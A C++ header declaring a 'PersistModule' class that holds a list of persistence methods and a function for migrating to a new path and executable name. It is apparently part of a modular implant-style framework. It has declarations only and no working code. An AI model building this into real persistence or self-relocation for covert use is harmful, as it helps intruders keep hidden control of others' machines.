#pragma once
#include <Common.h>
#include <Module.h>
#include <Logging.h>
//#include <protogen/manager.pb.h>
#include "PersistInter.h"
#include "PersistMethod.h"
#include <modules/manager/ManagerInter.h>
#include <boost/thread/mutex.hpp>
#include <boost/filesystem.hpp>

namespace modules
{
  namespace persist
  {
    class PersistModule : public modules::Module
    {
    public:
      PersistModule();
      ~PersistModule();

      void shutdown();
      void setModuleInterface(ModuleInterface* inter);
      void injectDependency(u32 id, void* dep);
      void releaseDependency(u32 id);
      void* getPublicInterface();

      // Start migrating to that path.
      void startMigrateTo(boost::filesystem::path& path, std::string& targetExecutableName);

    private:
      modules::manager::ManagerInter* manager;
      boost::mutex managerInterMtx;
      ModuleInterface* mInter;
      charlie::CModuleStorage* stor;
      PersistInter *pInter;

      // List of persistmethod instances
      std::vector<std::shared_ptr<PersistMethod>> methods;
      void module_main();
    };
  };
};
